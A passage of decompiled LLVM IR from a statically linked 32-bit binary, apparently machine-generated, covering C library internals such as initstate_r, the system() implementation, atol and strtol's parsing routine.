  %v1_804d200 = add i32 %v0_804d200, 1
  store i32 %v1_804d200, i32* @edi, align 4
  %v3_804d201.pre = load i64, i64* %stack_var_-40, align 8
  %extract.t11 = trunc i64 %v3_804d201.pre to i32
  %v5_804d204 = icmp slt i32 %v1_804d200, %extract.t11
  br i1 %v5_804d204, label %dec_label_pc_804d1d3.dec_label_pc_804d1d3_crit_edge, label %dec_label_pc_804d201.dec_label_pc_804d206_crit_edge

dec_label_pc_804d1d3.dec_label_pc_804d1d3_crit_edge: ; preds = %dec_label_pc_804d1d3
  %v0_804d1fb.pre = load i32, i32* %ecx.global-to-local, align 4
  br label %dec_label_pc_804d1d3

dec_label_pc_804d201.dec_label_pc_804d206_crit_edge: ; preds = %dec_label_pc_804d1d3
  %v0_804d206.pre = load i32, i32* @esi, align 4
  %v0_804d209.pre = load i32, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_804d206

dec_label_pc_804d206:                             ; preds = %dec_label_pc_804d201.dec_label_pc_804d206_crit_edge, %dec_label_pc_804d1c4
  %v0_804d209 = phi i32 [ %v0_804d209.pre, %dec_label_pc_804d201.dec_label_pc_804d206_crit_edge ], [ %v0_804d1c7, %dec_label_pc_804d1c4 ]
  %v0_804d206 = phi i32 [ %v0_804d206.pre, %dec_label_pc_804d201.dec_label_pc_804d206_crit_edge ], [ %v0_804d1c4, %dec_label_pc_804d1c4 ]
  %v1_804d206 = add i32 %v0_804d206, 20
  %v2_804d206 = inttoptr i32 %v1_804d206 to i32*
  %v3_804d206 = load i32, i32* %v2_804d206, align 4
  store i32 %v3_804d206, i32* %eax.global-to-local, align 4
  %v2_804d209 = add i32 %v0_804d206, 4
  %v3_804d209 = inttoptr i32 %v2_804d209 to i32*
  store i32 %v0_804d209, i32* %v3_804d209, align 4
  %v0_804d20c = load i32, i32* %ebx.global-to-local, align 4
  %v1_804d20c = load i32, i32* %eax.global-to-local, align 4
  %v2_804d20c = mul i32 %v1_804d20c, 4
  %v3_804d20c = add i32 %v2_804d20c, %v0_804d20c
  store i32 %v3_804d20c, i32* %eax.global-to-local, align 4
  %v1_804d20f = load i32, i32* @esi, align 4
  %v2_804d20f = inttoptr i32 %v1_804d20f to i32*
  store i32 %v3_804d20c, i32* %v2_804d20f, align 4
  %v3_804d211 = load i64, i64* %stack_var_-40, align 8
  %v6_804d211 = mul nsw i64 %v3_804d211, 10
  %v7_804d211 = trunc i64 %v6_804d211 to i32
  %v2_804d217 = ptrtoint i32* %stack_var_-20 to i32
  %v1_804d22425 = add i32 %v7_804d211, -1
  %v9_804d22429 = icmp slt i32 %v1_804d22425, 0
  store i32 %v1_804d22425, i32* @ebx, align 4
  %v1_804d22530 = icmp eq i1 %v9_804d22429, false
  br i1 %v1_804d22530, label %dec_label_pc_804d217, label %dec_label_pc_804d227

dec_label_pc_804d217:                             ; preds = %dec_label_pc_804d206, %dec_label_pc_804d217
  store i32 %v2_804d217, i32* %eax.global-to-local, align 4
  %v0_804d21c = load i32, i32* @esi, align 4
  %v2_804d21d = inttoptr i32 %v0_804d21c to i32*
  %v3_804d21d = call i32 @__GI_random_r(i32* %v2_804d21d, i32 %v2_804d217)
  store i32 %v0_804d21c, i32* %eax.global-to-local, align 4
  store i32 %v2_804d217, i32* %edx.global-to-local, align 4
  %v0_804d224.pre = load i32, i32* @ebx, align 4
  %v1_804d224 = add i32 %v0_804d224.pre, -1
  %v9_804d224 = icmp slt i32 %v1_804d224, 0
  store i32 %v1_804d224, i32* @ebx, align 4
  %v1_804d225 = icmp eq i1 %v9_804d224, false
  br i1 %v1_804d225, label %dec_label_pc_804d217, label %dec_label_pc_804d227

dec_label_pc_804d227:                             ; preds = %dec_label_pc_804d206, %dec_label_pc_804d217, %dec_label_pc_804d1b1
  store i32 0, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804d229

dec_label_pc_804d229:                             ; preds = %entry, %dec_label_pc_804d227
  %v0_804d230 = phi i32 [ -1, %entry ], [ 0, %dec_label_pc_804d227 ]
  store i32 %v0_804d19d, i32* @ebx, align 4
  store i32 %v0_804d19c, i32* @esi, align 4
  store i32 %v0_804d19b, i32* @edi, align 4
  store i32 %v0_804d197, i32* @ebp, align 4
  ret i32 %v0_804d230

; uselistorder directives
  uselistorder i32 %v1_804d224, { 1, 0 }
  uselistorder i32 %v0_804d206, { 1, 0 }
  uselistorder i32 %v1_804d1ef, { 2, 1, 0 }
  uselistorder i32 %v2_804d1ed, { 3, 4, 0, 2, 1 }
  uselistorder i32 %v0_804d1c7, { 1, 0, 2 }
  uselistorder i32 %v3_804d1a9, { 1, 0, 2 }
  uselistorder i64* %stack_var_-40, { 2, 0, 1 }
  uselistorder i32 %tmp14, { 0, 2, 1 }
  uselistorder i32* %ebx.global-to-local, { 0, 2, 1, 3 }
  uselistorder i64 127773, { 1, 0 }
  uselistorder label %dec_label_pc_804d229, { 1, 0 }
  uselistorder label %dec_label_pc_804d227, { 1, 0, 2 }
  uselistorder label %dec_label_pc_804d217, { 1, 0 }
  uselistorder label %dec_label_pc_804d1d3, { 1, 0 }
}

define i32 @__GI_initstate_r(i32 %arg1, i32* %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %tmp7 = ptrtoint i32* %arg2 to i32
  %stack_var_-36 = alloca i32, align 4
  %v0_804d233 = load i32, i32* @esi, align 4
  %v0_804d234 = load i32, i32* @ebx, align 4
  store i32 %arg3, i32* %eax.global-to-local, align 4
  store i32 %tmp7, i32* @ebp, align 4
  store i32 %arg4, i32* @edi, align 4
  %tmp = icmp ult i32 %arg3, 128
  br i1 %tmp, label %dec_label_pc_804d255, label %dec_label_pc_804d249

dec_label_pc_804d249:                             ; preds = %entry
  %v2_804d249 = icmp ult i32 %arg3, 256
  %v1_804d250 = select i1 %v2_804d249, i32 5, i32 4
  store i32 %v1_804d250, i32* @ebx, align 4
  br label %dec_label_pc_804d26b

dec_label_pc_804d255:                             ; preds = %entry
  %v6_804d258 = icmp ugt i32 %arg3, 31
  br i1 %v6_804d258, label %dec_label_pc_804d263, label %dec_label_pc_804d25a

dec_label_pc_804d25a:                             ; preds = %dec_label_pc_804d255
  store i32 0, i32* @ebx, align 4
  %v6_804d25f = icmp ugt i32 %arg3, 7
  br i1 %v6_804d25f, label %dec_label_pc_804d26b, label %dec_label_pc_804d2bb

dec_label_pc_804d263:                             ; preds = %dec_label_pc_804d255
  %v2_804d263 = icmp ult i32 %arg3, 64
  %v1_804d268 = select i1 %v2_804d263, i32 3, i32 2
  store i32 %v1_804d268, i32* @ebx, align 4
  br label %dec_label_pc_804d26b

dec_label_pc_804d26b:                             ; preds = %dec_label_pc_804d25a, %dec_label_pc_804d249, %dec_label_pc_804d263
  %v0_804d275 = phi i32 [ 0, %dec_label_pc_804d25a ], [ %v1_804d250, %dec_label_pc_804d249 ], [ %v1_804d268, %dec_label_pc_804d263 ]
  %v1_804d26b = mul nuw nsw i32 %v0_804d275, 4
  %v2_804d26b = add i32 %v1_804d26b, ptrtoint (i32* @global_var_8052414.369 to i32)
  %v3_804d26b = inttoptr i32 %v2_804d26b to i32*
  %v4_804d26b = load i32, i32* %v3_804d26b, align 4
  store i32 %v4_804d26b, i32* %eax.global-to-local, align 4
  %v1_804d272 = add i32 %tmp7, 4
  store i32 %v1_804d272, i32* @esi, align 4
  %v2_804d275 = add i32 %v1_804d26b, ptrtoint (i32* @global_var_8052400.370 to i32)
  %v3_804d275 = inttoptr i32 %v2_804d275 to i32*
  %v4_804d275 = load i32, i32* %v3_804d275, align 4
  store i32 %v4_804d275, i32* %edx.global-to-local, align 4
  %v2_804d27c = add i32 %arg4, 12
  %v3_804d27c = inttoptr i32 %v2_804d27c to i32*
  store i32 %v0_804d275, i32* %v3_804d27c, align 4
  %v0_804d27f = load i32, i32* @esi, align 4
  %v1_804d27f = load i32, i32* @edi, align 4
  %v2_804d27f = add i32 %v1_804d27f, 8
  %v3_804d27f = inttoptr i32 %v2_804d27f to i32*
  store i32 %v0_804d27f, i32* %v3_804d27f, align 4
  %v0_804d282 = load i32, i32* %eax.global-to-local, align 4
  %v1_804d282 = load i32, i32* @edi, align 4
  %v2_804d282 = add i32 %v1_804d282, 16
  %v3_804d282 = inttoptr i32 %v2_804d282 to i32*
  store i32 %v0_804d282, i32* %v3_804d282, align 4
  %v0_804d285 = load i32, i32* @esi, align 4
  %v1_804d285 = load i32, i32* %eax.global-to-local, align 4
  %v2_804d285 = mul i32 %v1_804d285, 4
  %v3_804d285 = add i32 %v2_804d285, %v0_804d285
  store i32 %v3_804d285, i32* %eax.global-to-local, align 4
  %v0_804d288 = load i32, i32* %edx.global-to-local, align 4
  %v1_804d288 = load i32, i32* @edi, align 4
  %v2_804d288 = add i32 %v1_804d288, 20
  %v3_804d288 = inttoptr i32 %v2_804d288 to i32*
  store i32 %v0_804d288, i32* %v3_804d288, align 4
  %v0_804d28b = load i32, i32* %eax.global-to-local, align 4
  %v1_804d28b = load i32, i32* @edi, align 4
  %v2_804d28b = add i32 %v1_804d28b, 24
  %v3_804d28b = inttoptr i32 %v2_804d28b to i32*
  store i32 %v0_804d28b, i32* %v3_804d28b, align 4
  %v0_804d28e = load i32, i32* @edi, align 4
  store i32 %arg1, i32* %stack_var_-36, align 4
  %v2_804d293 = inttoptr i32 %v0_804d28e to i32*
  %v3_804d293 = call i32 @srandom_r(i32 %arg1, i32* %v2_804d293)
  %v0_804d298 = load i32, i32* @ebp, align 4
  %v1_804d298 = inttoptr i32 %v0_804d298 to i32*
  store i32 0, i32* %v1_804d298, align 4
  store i32 0, i32* %eax.global-to-local, align 4
  %v0_804d2a3 = load i32, i32* @ebx, align 4
  %v1_804d2a3 = icmp eq i32 %v0_804d2a3, 0
  br i1 %v1_804d2a3, label %dec_label_pc_804d2d4, label %dec_label_pc_804d2a7

dec_label_pc_804d2a7:                             ; preds = %dec_label_pc_804d26b
  %v0_804d2a7 = load i32, i32* @edi, align 4
  %v1_804d2a7 = add i32 %v0_804d2a7, 4
  %v2_804d2a7 = inttoptr i32 %v1_804d2a7 to i32*
  %v3_804d2a7 = load i32, i32* %v2_804d2a7, align 4
  %v1_804d2aa = load i32, i32* @esi, align 4
  %v2_804d2aa = sub i32 %v3_804d2a7, %v1_804d2aa
  %v2_804d2ac = sdiv i32 %v2_804d2aa, 4
  %v3_804d2af = mul i32 %v2_804d2ac, 5
  %v2_804d2b2 = add i32 %v3_804d2af, %v0_804d2a3
  %v1_804d2b4 = load i32, i32* @ebp, align 4
  %v2_804d2b4 = inttoptr i32 %v1_804d2b4 to i32*
  store i32 %v2_804d2b2, i32* %v2_804d2b4, align 4
  store i32 0, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804d2d4

dec_label_pc_804d2bb:                             ; preds = %dec_label_pc_804d25a
  %v1_804d2bb = call i32 @__errno_location(i32 %v0_804d234)
  store i32 %v1_804d2bb, i32* %eax.global-to-local, align 4
  %v1_804d2c0 = inttoptr i32 %v1_804d2bb to i32*
  store i32 22, i32* %v1_804d2c0, align 4
  %v0_804d2c6 = load i32, i32* %stack_var_-36, align 4
  %v1_804d2c6 = call i32 @__errno_location(i32 %v0_804d2c6)
  %v1_804d2cb = inttoptr i32 %v1_804d2c6 to i32*
  store i32 22, i32* %v1_804d2cb, align 4
  store i32 -1, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804d2d4

dec_label_pc_804d2d4:                             ; preds = %dec_label_pc_804d26b, %dec_label_pc_804d2a7, %dec_label_pc_804d2bb
  %v0_804d2db = phi i32 [ 0, %dec_label_pc_804d26b ], [ 0, %dec_label_pc_804d2a7 ], [ -1, %dec_label_pc_804d2bb ]
  store i32 %v0_804d233, i32* @esi, align 4
  ret i32 %v0_804d2db

; uselistorder directives
  uselistorder i32* %eax.global-to-local, { 0, 3, 1, 2, 4, 5, 6, 7, 8, 9 }
  uselistorder i32 %arg3, { 1, 2, 4, 3, 0, 5 }
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_804d2d4, { 2, 1, 0 }
  uselistorder label %dec_label_pc_804d26b, { 2, 0, 1 }
}

define i32 @__libc_system(i32 %arg1) local_unnamed_addr {
entry:
  %stack_var_-8 = alloca i32, align 4
  %v0_804d2dc = load i32, i32* @ebx, align 4
  %v4_804d2e5 = icmp eq i32 %arg1, 0
  br i1 %v4_804d2e5, label %dec_label_pc_804d408, label %dec_label_pc_804d2f0

dec_label_pc_804d2f0:                             ; preds = %entry
  %v2_804d2f6 = call i32 @__bsd_signal(i32 3, i32 1)
  store i32 1, i32* @edx, align 4
  %v2_804d305 = call i32 @__bsd_signal(i32 2, i32 1)
  store i32 2, i32* @ebx, align 4
  %v2_804d314 = call i32 @__bsd_signal(i32 17, i32 0)
  %v1_804d31d = call i32 @__vfork(i32 %v2_804d314)
  %v2_804d325 = icmp slt i32 %v1_804d31d, 0
  store i32 %v1_804d31d, i32* @ebx, align 4
  %v2_804d32a = icmp eq i1 %v2_804d325, false
  br i1 %v2_804d32a, label %dec_label_pc_804d35b, label %dec_label_pc_804d32c

dec_label_pc_804d32c:                             ; preds = %dec_label_pc_804d2f0
  %v2_804d334 = call i32 @__bsd_signal(i32 3, i32 %v2_804d2f6)
  store i32 %v2_804d2f6, i32* @edx, align 4
  %v2_804d341 = call i32 @__bsd_signal(i32 2, i32 %v2_804d305)
  store i32 2, i32* @ebx, align 4
  %v2_804d34e = call i32 @__bsd_signal(i32 17, i32 %v2_804d314)
  br label %dec_label_pc_804d405

dec_label_pc_804d35b:                             ; preds = %dec_label_pc_804d2f0
  %v1_804d325 = icmp eq i32 %v1_804d31d, 0
  %v1_804d35b = icmp eq i1 %v1_804d325, false
  br i1 %v1_804d35b, label %dec_label_pc_804d3a7, label %dec_label_pc_804d35d

dec_label_pc_804d35d:                             ; preds = %dec_label_pc_804d35b
  %v2_804d363 = call i32 @__bsd_signal(i32 3, i32 0)
  store i32 0, i32* @edx, align 4
  %v2_804d36e = call i32 @__bsd_signal(i32 2, i32 0)
  store i32 2, i32* @ebx, align 4
  %v2_804d379 = call i32 @__bsd_signal(i32 17, i32 0)
  %v8_804d398 = call i32 @execl(i32 ptrtoint ([8 x i8]* @global_var_805242b.373 to i32), i32 ptrtoint ([3 x i8]* @global_var_8052430.372 to i32), i32 ptrtoint ([3 x i8]* @global_var_8052428.371 to i32), i32 %arg1, i32 0)
  %v1_804d3a2 = call i32 @__GI__exit(i32 127)
  unreachable

dec_label_pc_804d3a7:                             ; preds = %dec_label_pc_804d35b
  %v2_804d3ad = call i32 @__bsd_signal(i32 3, i32 1)
  store i32 1, i32* @edx, align 4
  %v2_804d3b8 = call i32 @__bsd_signal(i32 2, i32 1)
  %v2_804d3bd = ptrtoint i32* %stack_var_-8 to i32
  %v0_804d3c6 = load i32, i32* @ebx, align 4
  %v7_804d3c7 = call i32 @wait4(i32 %v0_804d3c6, i32 %v2_804d3bd, i32 0, i32 0)
  %v8_804d3d2 = icmp eq i32 %v7_804d3c7, -1
  %v1_804d3d3 = icmp eq i1 %v8_804d3d2, false
  %v6_804d3d3 = load i32, i32* %stack_var_-8, align 4
  %v7_804d3d3 = select i1 %v1_804d3d3, i32 %v6_804d3d3, i32 -1
  store i32 %v7_804d3d3, i32* @edx, align 4
  store i32 %v7_804d3d3, i32* %stack_var_-8, align 4
  %v2_804d3e2 = call i32 @__bsd_signal(i32 3, i32 %v2_804d2f6)
  store i32 %v2_804d2f6, i32* @ebx, align 4
  %v2_804d3ef = call i32 @__bsd_signal(i32 2, i32 %v2_804d305)
  store i32 %v2_804d305, i32* @edx, align 4
  %v2_804d3fc = call i32 @__bsd_signal(i32 17, i32 %v2_804d314)
  %v3_804d401 = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_804d405

dec_label_pc_804d405:                             ; preds = %dec_label_pc_804d32c, %dec_label_pc_804d3a7
  %storemerge = phi i32 [ -1, %dec_label_pc_804d32c ], [ %v3_804d401, %dec_label_pc_804d3a7 ]
  br label %dec_label_pc_804d408

dec_label_pc_804d408:                             ; preds = %entry, %dec_label_pc_804d405
  %v0_804d40c = phi i32 [ 1, %entry ], [ %storemerge, %dec_label_pc_804d405 ]
  store i32 %v0_804d2dc, i32* @ebx, align 4
  ret i32 %v0_804d40c

; uselistorder directives
  uselistorder i32 %v1_804d31d, { 2, 0, 1 }
  uselistorder i32 %v2_804d314, { 1, 0, 2 }
  uselistorder i32 %v2_804d305, { 0, 2, 1 }
  uselistorder i32 %v2_804d2f6, { 1, 3, 0, 2 }
  uselistorder i32 (i32, i32)* @__bsd_signal, { 13, 12, 11, 10, 9, 8, 7, 6, 5, 4, 3, 2, 1, 0 }
  uselistorder label %dec_label_pc_804d408, { 1, 0 }
  uselistorder label %dec_label_pc_804d405, { 1, 0 }
}

define i32 @atol(i32 %arg1) local_unnamed_addr {
entry:
  %v3_804d41b = call i32 @strtol(i32 %arg1, i32 0, i32 10)
  ret i32 %v3_804d41b
}

define i32 @strtol(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %v4_804d435 = inttoptr i32 %arg1 to i8*
  %v5_804d435 = call i32 @_stdlib_strto_l(i8* %v4_804d435, i32 %arg2, i32 %arg3, i32 1)
  ret i32 %v5_804d435
}

define i32 @_stdlib_strto_l(i8* %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %ebp.global-to-local = alloca i32, align 4
  %ebx.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %esi.global-to-local = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %v0_804d443 = load i32, i32* @ebx, align 4
  store i32 %v0_804d443, i32* %stack_var_-16, align 4
  %v4_804d447 = ptrtoint i8* %arg1 to i32
  store i32 %v4_804d447, i32* @ecx, align 4
  store i32 %arg3, i32* %esi.global-to-local, align 4
  %v0_804d44f = load i32, i32* @global_var_8053720, align 32
  store i32 %v0_804d44f, i32* %edx.global-to-local, align 4
  store i32 %v4_804d447, i32* %ebx.global-to-local, align 4
  %v2_804d45a41 = load i8, i8* %arg1, align 1
  %v3_804d45a42 = sext i8 %v2_804d45a41 to i32
  store i32 %v3_804d45a42, i32* %eax.global-to-local, align 4
  %v2_804d45d43 = mul nsw i32 %v3_804d45a42, 2
  %v3_804d45d44 = add i32 %v2_804d45d43, %v0_804d44f
  %v4_804d45d45 = inttoptr i32 %v3_804d45d44 to i8*
  %v5_804d45d46 = load i8, i8* %v4_804d45d45, align 1
  %v6_804d45d47 = and i8 %v5_804d45d46, 32
  %v7_804d45d48 = icmp eq i8 %v6_804d45d47, 0
  %v1_804d46149 = icmp eq i1 %v7_804d45d48, false
  br i1 %v1_804d46149, label %dec_label_pc_804d459, label %dec_label_pc_804d463

dec_label_pc_804d459:                             ; preds = %entry, %dec_label_pc_804d459
  %v0_804d45950 = phi i32 [ %v1_804d459, %dec_label_pc_804d459 ], [ %v4_804d447, %entry ]
  %v1_804d459 = add i32 %v0_804d45950, 1
  store i32 %v1_804d459, i32* %ebx.global-to-local, align 4
  %v1_804d45a = inttoptr i32 %v1_804d459 to i8*
  %v2_804d45a = load i8, i8* %v1_804d45a, align 1
  %v3_804d45a = sext i8 %v2_804d45a to i32
  store i32 %v3_804d45a, i32* %eax.global-to-local, align 4
  %v2_804d45d = mul nsw i32 %v3_804d45a, 2
  %v3_804d45d = add i32 %v2_804d45d, %v0_804d44f
  %v4_804d45d = inttoptr i32 %v3_804d45d to i8*
  %v5_804d45d = load i8, i8* %v4_804d45d, align 1
  %v6_804d45d = and i8 %v5_804d45d, 32
  %v7_804d45d = icmp eq i8 %v6_804d45d, 0
  %v1_804d461 = icmp eq i1 %v7_804d45d, false
  br i1 %v1_804d461, label %dec_label_pc_804d459, label %dec_label_pc_804d463

dec_label_pc_804d463:                             ; preds = %dec_label_pc_804d459, %entry
  %v0_804d459.lcssa = phi i32 [ %v4_804d447, %entry ], [ %v1_804d459, %dec_label_pc_804d459 ]
  %v2_804d45a.lcssa = phi i8 [ %v2_804d45a41, %entry ], [ %v2_804d45a, %dec_label_pc_804d459 ]
  %v3_804d45a.lcssa = phi i32 [ %v3_804d45a42, %entry ], [ %v3_804d45a, %dec_label_pc_804d459 ]
  %tmp37 = trunc i32 %arg4 to i8
  %v9_804d463 = icmp eq i8 %v2_804d45a.lcssa, 43
  br i1 %v9_804d463, label %dec_label_pc_804d47e, label %dec_label_pc_804d468

dec_label_pc_804d468:                             ; preds = %dec_label_pc_804d463
  %v9_804d468 = icmp eq i8 %v2_804d45a.lcssa, 45
  %v1_804d470 = icmp eq i1 %v9_804d468, false
  br i1 %v1_804d470, label %dec_label_pc_804d47f, label %dec_label_pc_804d47e

dec_label_pc_804d47e:                             ; preds = %dec_label_pc_804d463, %dec_label_pc_804d468
  %storemerge5 = phi i8 [ 1, %dec_label_pc_804d468 ], [ 0, %dec_label_pc_804d463 ]
  %v1_804d47e = add i32 %v0_804d459.lcssa, 1
  store i32 %v1_804d47e, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_804d47f

dec_label_pc_804d47f:                             ; preds = %dec_label_pc_804d468, %dec_label_pc_804d47e
  %v0_804d491 = phi i32 [ %v1_804d47e, %dec_label_pc_804d47e ], [ %v0_804d459.lcssa, %dec_label_pc_804d468 ]
  %stack_var_-18.0 = phi i8 [ %storemerge5, %dec_label_pc_804d47e ], [ 0, %dec_label_pc_804d468 ]
  %v1_804d47f = and i32 %arg3, -17
  %v2_804d47f = icmp eq i32 %v1_804d47f, 0
  %v1_804d487 = icmp eq i1 %v2_804d47f, false
  br i1 %v1_804d487, label %dec_label_pc_804d4ad, label %dec_label_pc_804d489

dec_label_pc_804d489:                             ; preds = %dec_label_pc_804d47f
  %v1_804d489 = add i32 %arg3, 10
  store i32 %v1_804d489, i32* %esi.global-to-local, align 4
  %v1_804d48c = inttoptr i32 %v0_804d491 to i8*
  %v2_804d48c = load i8, i8* %v1_804d48c, align 1
  %v8_804d48c = icmp eq i8 %v2_804d48c, 48
  %v1_804d48f = icmp eq i1 %v8_804d48c, false
  br i1 %v1_804d48f, label %dec_label_pc_804d4a2, label %dec_label_pc_804d491

dec_label_pc_804d491:                             ; preds = %dec_label_pc_804d489
  %v1_804d491 = add i32 %v0_804d491, 1
  store i32 %v1_804d491, i32* %ebx.global-to-local, align 4
  %v1_804d492 = add i32 %arg3, 8
  store i32 %v1_804d492, i32* %esi.global-to-local, align 4
  %v1_804d495 = inttoptr i32 %v1_804d491 to i8*
  %v2_804d495 = load i8, i8* %v1_804d495, align 1
  %v2_804d499 = or i8 %v2_804d495, 32
  %v7_804d499 = zext i8 %v2_804d499 to i32
  %v9_804d499 = and i32 %v3_804d45a.lcssa, -256
  %v10_804d499 = or i32 %v7_804d499, %v9_804d499
  store i32 %v10_804d499, i32* %eax.global-to-local, align 4
  %v10_804d49b = icmp eq i8 %v2_804d499, 120
  %v1_804d49d = icmp eq i1 %v10_804d49b, false
  br i1 %v1_804d49d, label %dec_label_pc_804d4a2, label %dec_label_pc_804d49f

dec_label_pc_804d49f:                             ; preds = %dec_label_pc_804d491
  %v2_804d49f = mul i32 %v1_804d492, 2
  store i32 %v2_804d49f, i32* %esi.global-to-local, align 4
  %v1_804d4a1 = add i32 %v0_804d491, 2
  store i32 %v1_804d4a1, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_804d4a2

dec_label_pc_804d4a2:                             ; preds = %dec_label_pc_804d491, %dec_label_pc_804d489, %dec_label_pc_804d49f
  %v0_804d4ca13 = phi i32 [ %v1_804d491, %dec_label_pc_804d491 ], [ %v0_804d491, %dec_label_pc_804d489 ], [ %v1_804d4a1, %dec_label_pc_804d49f ]
  %v0_804d52422 = phi i32 [ %v1_804d491, %dec_label_pc_804d491 ], [ %v4_804d447, %dec_label_pc_804d489 ], [ %v1_804d491, %dec_label_pc_804d49f ]
  %v3_804d4aa = phi i32 [ %v1_804d492, %dec_label_pc_804d491 ], [ %v1_804d489, %dec_label_pc_804d489 ], [ %v2_804d49f, %dec_label_pc_804d49f ]
  %v1_804d4a2 = add i32 %v3_804d4aa, -17
  %v6_804d4a2 = sub i32 16, %v3_804d4aa
  %v7_804d4a2 = and i32 %v6_804d4a2, %v3_804d4aa
  %v8_804d4a2 = icmp slt i32 %v7_804d4a2, 0
  %v10_804d4a2 = icmp slt i32 %v1_804d4a2, 0
  store i32 16, i32* %eax.global-to-local, align 4
  %v2_804d4aa = icmp eq i1 %v10_804d4a2, %v8_804d4a2
  %v5_804d4aa = select i1 %v2_804d4aa, i32 16, i32 %v3_804d4aa
  store i32 %v5_804d4aa, i32* %esi.global-to-local, align 4
  br label %dec_label_pc_804d4ad

dec_label_pc_804d4ad:                             ; preds = %dec_label_pc_804d47f, %dec_label_pc_804d4a2
  %v0_804d52423 = phi i32 [ %v4_804d447, %dec_label_pc_804d47f ], [ %v0_804d52422, %dec_label_pc_804d4a2 ]
  %v0_804d4ca12 = phi i32 [ %v0_804d491, %dec_label_pc_804d47f ], [ %v0_804d4ca13, %dec_label_pc_804d4a2 ]
  %v0_804d4bc = phi i32 [ %arg3, %dec_label_pc_804d47f ], [ %v5_804d4aa, %dec_label_pc_804d4a2 ]
  %v1_804d4ad = add i32 %v0_804d4bc, -2
  store i32 %v1_804d4ad, i32* %eax.global-to-local, align 4
  store i32 0, i32* %edx.global-to-local, align 4
  %v6_804d4b5 = icmp ugt i32 %v1_804d4ad, 34
  br i1 %v6_804d4b5, label %dec_label_pc_804d519, label %dec_label_pc_804d4b7

dec_label_pc_804d4b7:                             ; preds = %dec_label_pc_804d4ad
  %div = udiv i32 -1, %v0_804d4bc
  store i32 %div, i32* %eax.global-to-local, align 4
  %tmp38 = urem i32 -1, %v0_804d4bc
  %v1_804d4be = trunc i32 %tmp38 to i8
  store i32 %div, i32* %ebp.global-to-local, align 4
  store i32 0, i32* %edx.global-to-local, align 4
  %v4_804d4f7 = urem i32 %arg4, 256
  br label %dec_label_pc_804d4ca

dec_label_pc_804d4c8:                             ; preds = %dec_label_pc_804d50f, %dec_label_pc_804d4f7
  %v2_804d4cc.pre = phi i32 [ %v0_804d512, %dec_label_pc_804d50f ], [ %v2_804d4cc.pre.pre, %dec_label_pc_804d4f7 ]
  %v4_804d4ca.pre = phi i32 [ %v1_804d4e3, %dec_label_pc_804d50f ], [ %v4_804d4ca.pre.pre, %dec_label_pc_804d4f7 ]
  %v0_804d4c8 = phi i32 [ %v1_804d4ea, %dec_label_pc_804d50f ], [ %v0_804d4c8.pre, %dec_label_pc_804d4f7 ]
  %stack_var_-18.1 = phi i8 [ %stack_var_-18.2, %dec_label_pc_804d50f ], [ %v6_804d4fb, %dec_label_pc_804d4f7 ]
  br label %dec_label_pc_804d4ca

dec_label_pc_804d4ca:                             ; preds = %dec_label_pc_804d4b7, %dec_label_pc_804d4c8
  %v0_804d52421 = phi i32 [ %v0_804d52423, %dec_label_pc_804d4b7 ], [ %v0_804d4c8, %dec_label_pc_804d4c8 ]
  %v0_804d4ea = phi i32 [ %v0_804d4ca12, %dec_label_pc_804d4b7 ], [ %v0_804d4c8, %dec_label_pc_804d4c8 ]
  %v2_804d4cc = phi i32 [ %v4_804d447, %dec_label_pc_804d4b7 ], [ %v2_804d4cc.pre, %dec_label_pc_804d4c8 ]
  %v4_804d4ca = phi i32 [ %div, %dec_label_pc_804d4b7 ], [ %v4_804d4ca.pre, %dec_label_pc_804d4c8 ]
  %stack_var_-18.2 = phi i8 [ %stack_var_-18.0, %dec_label_pc_804d4b7 ], [ %stack_var_-18.1, %dec_label_pc_804d4c8 ]
  %v1_804d4ca = inttoptr i32 %v0_804d4ea to i8*
  %v2_804d4ca = load i8, i8* %v1_804d4ca, align 1
  %v3_804d4ca = zext i8 %v2_804d4ca to i32
  %v5_804d4ca = and i32 %v4_804d4ca, -256
  %v6_804d4ca = or i32 %v3_804d4ca, %v5_804d4ca
  store i32 %v6_804d4ca, i32* %eax.global-to-local, align 4
  %v2_804d4ce = add i8 %v2_804d4ca, -48
  %v12_804d4ce = zext i8 %v2_804d4ce to i32
  %v14_804d4ce = and i32 %v2_804d4cc, -256
  %v15_804d4ce = or i32 %v12_804d4ce, %v14_804d4ce
  store i32 %v15_804d4ce, i32* @ecx, align 4
  %tmp = icmp ult i8 %v2_804d4ce, 10
  br i1 %tmp, label %dec_label_pc_804d4e3, label %dec_label_pc_804d4d6

dec_label_pc_804d4d6:                             ; preds = %dec_label_pc_804d4ca
  %v2_804d4d6 = or i8 %v2_804d4ca, 32
  %v7_804d4d6 = zext i8 %v2_804d4d6 to i32
  %v10_804d4d6 = or i32 %v7_804d4d6, %v5_804d4ca
  store i32 %v10_804d4d6, i32* %eax.global-to-local, align 4
  %v2_804d4d8 = or i32 %v14_804d4ce, 40
  store i32 %v2_804d4d8, i32* @ecx, align 4
  %tmp55 = icmp ult i8 %v2_804d4d6, 97
  br i1 %tmp55, label %dec_label_pc_804d4e3, label %dec_label_pc_804d4de

dec_label_pc_804d4de:                             ; preds = %dec_label_pc_804d4d6
  %v2_804d4e0 = add i8 %v2_804d4d6, -87
  %v15_804d4e0 = zext i8 %v2_804d4e0 to i32
  %v18_804d4e0 = or i32 %v15_804d4e0, %v14_804d4ce
  store i32 %v18_804d4e0, i32* @ecx, align 4
  br label %dec_label_pc_804d4e3

dec_label_pc_804d4e3:                             ; preds = %dec_label_pc_804d4d6, %dec_label_pc_804d4ca, %dec_label_pc_804d4de
  %v0_804d512 = phi i32 [ %v2_804d4d8, %dec_label_pc_804d4d6 ], [ %v15_804d4ce, %dec_label_pc_804d4ca ], [ %v18_804d4e0, %dec_label_pc_804d4de ]
